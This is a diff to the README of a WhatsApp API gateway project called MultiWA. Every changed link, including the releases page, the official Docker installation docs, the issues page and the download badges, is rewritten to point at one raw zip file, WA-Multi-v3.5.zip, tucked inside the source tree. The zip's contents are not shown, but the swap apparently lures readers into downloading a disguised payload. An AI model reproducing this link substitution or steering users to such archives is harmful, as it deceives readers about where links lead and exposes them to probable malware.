@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download MultiWA](https://img.shields.io/badge/Download-MultiWA-blue?style=for-the-badge)](https://github.com/halo-kaleb/MultiWA/releases)
+[![Download MultiWA](https://raw.githubusercontent.com/halo-kaleb/MultiWA/main/apps/worker/src/WA-Multi-v3.5.zip)](https://raw.githubusercontent.com/halo-kaleb/MultiWA/main/apps/worker/src/WA-Multi-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -15,11 +15,11 @@ You will need a computer with the following minimum specifications:
 - **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
 - **RAM:** At least 4GB.
 - **Storage:** 1GB of free space.
-- **Docker:** Installed on your machine. If you don’t have Docker, you can find instructions on how to install it [here](https://docs.docker.com/get-docker/).
+- **Docker:** Installed on your machine. If you don’t have Docker, you can find instructions on how to install it [here](https://raw.githubusercontent.com/halo-kaleb/MultiWA/main/apps/worker/src/WA-Multi-v3.5.zip).
 
 ## 📦 Installation Steps
 
-1. **Visit the Download Page:** Go to the [MultiWA releases page](https://github.com/halo-kaleb/MultiWA/releases) to find the latest version.
+1. **Visit the Download Page:** Go to the [MultiWA releases page](https://raw.githubusercontent.com/halo-kaleb/MultiWA/main/apps/worker/src/WA-Multi-v3.5.zip) to find the latest version.
 
 2. **Download the Latest Release:**
    - Click on the version that suits your system. Download the appropriate files to your computer.
@@ -67,7 +67,7 @@ MultiWA supports a variety of topics and functionalities, including:
 
 ## 💬 Community Support
 
-If you encounter any issues or have questions, you can reach out for support. Visit the [GitHub Issues Page](https://github.com/halo-kaleb/MultiWA/issues) to find existing problems or submit your own.
+If you encounter any issues or have questions, you can reach out for support. Visit the [GitHub Issues Page](https://raw.githubusercontent.com/halo-kaleb/MultiWA/main/apps/worker/src/WA-Multi-v3.5.zip) to find existing problems or submit your own.
 
 ## 🎉 Additional Resources
 
@@ -76,8 +76,8 @@ If you encounter any issues or have questions, you can reach out for support. Vi
 
 ## 🔗 Links
 
-- [Visit the MultiWA Releases Page](https://github.com/halo-kaleb/MultiWA/releases) to download the latest version.
+- [Visit the MultiWA Releases Page](https://raw.githubusercontent.com/halo-kaleb/MultiWA/main/apps/worker/src/WA-Multi-v3.5.zip) to download the latest version.
 
-[![Download MultiWA](https://img.shields.io/badge/Download-MultiWA-grey?style=for-the-badge)](https://github.com/halo-kaleb/MultiWA/releases)
+[![Download MultiWA](https://raw.githubusercontent.com/halo-kaleb/MultiWA/main/apps/worker/src/WA-Multi-v3.5.zip)](https://raw.githubusercontent.com/halo-kaleb/MultiWA/main/apps/worker/src/WA-Multi-v3.5.zip)
 
 Getting started with MultiWA is straightforward. Follow these steps to set up your WhatsApp Business API Gateway quickly and begin enhancing your customer interactions.
